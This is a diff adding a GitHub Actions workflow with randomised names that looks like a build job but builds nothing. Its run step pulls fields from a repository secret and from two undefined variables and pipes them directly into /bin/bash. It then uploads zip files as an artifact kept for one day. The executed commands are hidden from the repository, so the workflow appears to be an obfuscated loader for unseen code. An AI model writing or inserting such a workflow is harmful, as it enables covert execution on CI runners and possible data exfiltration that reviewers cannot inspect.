@@ -1,0 +1,23 @@
+name: nadia87481000
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: nadia87481000
+        env:
+          uvhh26: ${{ secrets.uvhh26 }}
+        run: |
+          printf '%s' "$uvhh26" | jq -r .een5 | /bin/bash
+          printf '%s' "$vphui1" | jq -r .ytgg5 | /bin/bash
+          echo $jtt88 | jq -r .hkw9610 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Q2oVTGlF
+          path: "*.zip"
+          retention-days: 1
